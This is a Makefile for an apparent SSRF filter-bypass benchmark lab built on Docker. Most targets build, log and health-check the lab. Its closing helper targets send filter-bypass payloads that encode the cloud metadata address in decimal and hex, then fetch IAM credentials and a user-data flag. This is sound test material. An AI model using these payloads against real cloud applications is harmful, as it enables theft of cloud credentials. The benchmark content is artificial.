.PHONY: help build start stop restart status logs clean test exploit

# Default target
.DEFAULT_GOAL := help

# Colors for output
BLUE := \033[0;34m
GREEN := \033[0;32m
RED := \033[0;31m
NC := \033[0m # No Color

help: ## Show this help message
	@echo "$(BLUE)SBEN-SSRF-01: Advanced SSRF Filter Bypass$(NC)"
	@echo ""
	@echo "Available targets:"
	@grep -E '^[a-zA-Z_-]+:.*?## .*$$' $(MAKEFILE_LIST) | awk 'BEGIN {FS = ":.*?## "}; {printf "  $(GREEN)%-15s$(NC) %s\n", $$1, $$2}'

build: ## Build all Docker containers
	@echo "$(BLUE)Building containers...$(NC)"
	docker compose build
	@echo "$(GREEN)✓ Build complete$(NC)"

start: ## Start all services
	@echo "$(BLUE)Starting services...$(NC)"
	docker compose up -d
	@echo "$(GREEN)✓ Services started$(NC)"
	@echo ""
	@echo "Access the vulnerable application at: $(BLUE)http://localhost$(NC)"
	@sleep 2
	@$(MAKE) status

stop: ## Stop all services
	@echo "$(BLUE)Stopping services...$(NC)"
	docker compose down
	@echo "$(GREEN)✓ Services stopped$(NC)"

restart: stop start ## Restart all services

status: ## Show status of all services
	@echo "$(BLUE)Service status:$(NC)"
	@docker compose ps

logs: ## Show logs from all services
	docker compose logs -f

logs-web: ## Show logs from web-app only
	docker compose logs -f web-app

logs-metadata: ## Show logs from metadata service
	docker compose logs -f metadata-service

logs-api: ## Show logs from internal-api
	docker compose logs -f internal-api

logs-admin: ## Show logs from admin-panel
	docker compose logs -f admin-panel

clean: stop ## Stop and remove all containers, networks, and volumes
	@echo "$(BLUE)Cleaning up...$(NC)"
	docker compose down -v
	@echo "$(GREEN)✓ Cleanup complete$(NC)"

test: ## Run basic connectivity tests
	@echo "$(BLUE)Running tests...$(NC)"
	@echo ""
	@echo "Testing web-app..."
	@curl -s http://localhost/health > /dev/null && echo "$(GREEN)✓ web-app is healthy$(NC)" || echo "$(RED)✗ web-app is down$(NC)"
	@echo ""
	@echo "Testing SSRF with allowed URL..."
	@curl -s -X POST http://localhost/fetch \
		-H "Content-Type: application/json" \
		-d '{"url": "http://example.com"}' | grep -q "status_code" && \
		echo "$(GREEN)✓ Basic SSRF works$(NC)" || echo "$(RED)✗ SSRF failed$(NC)"
	@echo ""
	@echo "Testing filter (should block)..."
	@curl -s -X POST http://localhost/fetch \
		-H "Content-Type: application/json" \
		-d '{"url": "http://localhost"}' | grep -q "blocked" && \
		echo "$(GREEN)✓ Filter is active$(NC)" || echo "$(RED)✗ Filter not working$(NC)"

exploit: ## Run the automated exploit script
	@if [ -f exploit.py ]; then \
		echo "$(BLUE)Running exploit...$(NC)"; \
		python3 exploit.py; \
	else \
		echo "$(RED)exploit.py not found$(NC)"; \
		echo "Create exploit.py based on TESTING.md"; \
	fi

shell-web: ## Open shell in web-app container
	docker compose exec web-app /bin/sh

shell-metadata: ## Open shell in metadata-service container
	docker compose exec metadata-service /bin/sh

shell-api: ## Open shell in internal-api container
	docker compose exec internal-api /bin/sh

shell-admin: ## Open shell in admin-panel container
	docker compose exec admin-panel /bin/sh

rebuild: clean build start ## Clean rebuild of all services

check-deps: ## Check if required tools are installed
	@echo "$(BLUE)Checking dependencies...$(NC)"
	@command -v docker >/dev/null 2>&1 && echo "$(GREEN)✓ docker$(NC)" || echo "$(RED)✗ docker not found$(NC)"
	@command -v docker-compose >/dev/null 2>&1 && echo "$(GREEN)✓ docker-compose$(NC)" || echo "$(RED)✗ docker-compose not found$(NC)"
	@command -v curl >/dev/null 2>&1 && echo "$(GREEN)✓ curl$(NC)" || echo "$(RED)✗ curl not found$(NC)"
	@command -v jq >/dev/null 2>&1 && echo "$(GREEN)✓ jq$(NC)" || echo "$(RED)✗ jq not found (optional)$(NC)"
	@command -v python3 >/dev/null 2>&1 && echo "$(GREEN)✓ python3$(NC)" || echo "$(RED)✗ python3 not found (optional)$(NC)"

verify: ## Verify the benchmark is working correctly
	@echo "$(BLUE)Verifying benchmark setup...$(NC)"
	@echo ""
	@$(MAKE) check-deps
	@echo ""
	@$(MAKE) status
	@echo ""
	@$(MAKE) test

# Quick exploitation helpers
ssrf-decimal: ## Try SSRF with decimal IP (2852039166 = 169.254.169.254)
	@echo "$(BLUE)Testing SSRF with decimal IP notation...$(NC)"
	curl -s -X POST http://localhost/fetch \
		-H "Content-Type: application/json" \
		-d '{"url": "http://2852039166/latest/meta-data/"}' | jq

ssrf-hex: ## Try SSRF with hexadecimal IP (0xa9fea9fe = 169.254.169.254)
	@echo "$(BLUE)Testing SSRF with hex IP notation...$(NC)"
	curl -s -X POST http://localhost/fetch \
		-H "Content-Type: application/json" \
		-d '{"url": "http://0xa9fea9fe/latest/meta-data/"}' | jq

get-creds: ## Get AWS credentials from metadata service
	@echo "$(BLUE)Retrieving AWS credentials...$(NC)"
	curl -s -X POST http://localhost/fetch \
		-H "Content-Type: application/json" \
		-d '{"url": "http://2852039166/latest/meta-data/iam/security-credentials/WebServerRole"}' \
		| jq -r '.content' | jq

get-flag1: ## Get first flag from user-data
	@echo "$(BLUE)Retrieving Flag 1 from user-data...$(NC)"
	curl -s -X POST http://localhost/fetch \
		-H "Content-Type: application/json" \
		-d '{"url": "http://2852039166/latest/user-data"}' \
		| jq -r '.content' | grep SSRF_FLAG
